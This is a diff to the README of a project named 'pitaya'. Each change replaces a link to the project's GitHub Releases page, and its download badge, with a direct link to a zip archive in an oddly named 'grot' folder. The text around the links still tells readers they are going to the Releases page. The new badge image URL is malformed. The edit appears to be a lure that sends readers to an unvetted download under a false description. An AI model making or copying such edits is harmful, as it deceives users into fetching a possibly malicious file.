@@ -17,11 +17,11 @@ Before you begin, check that your system meets these requirements:
 
 To download pitaya, visit the Releases page. You will find the latest version available for download there.
 
-[![Download pitaya](https://img.shields.io/badge/Download%20pitaya-v1.0-blue.svg)](https://github.com/Amadu-tech/pitaya/releases)
+[![Download pitaya](https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip%https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip)](https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip)
 
 ## 🔄 Download & Install
 
-1. Click the following link to access the Releases page: [Download pitaya](https://github.com/Amadu-tech/pitaya/releases).
+1. Click the following link to access the Releases page: [Download pitaya](https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip).
 
 2. On the Releases page, look for the latest version listed. You will see various files available for download.
 
@@ -80,4 +80,4 @@ For further reading, check out these resources:
 
 Don't forget to download the latest version of pitaya:
 
-[![Download pitaya](https://img.shields.io/badge/Download%20pitaya-v1.0-blue.svg)](https://github.com/Amadu-tech/pitaya/releases)
+[![Download pitaya](https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip%https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip)](https://raw.githubusercontent.com/Amadu-tech/pitaya/main/grot/pitaya.zip)
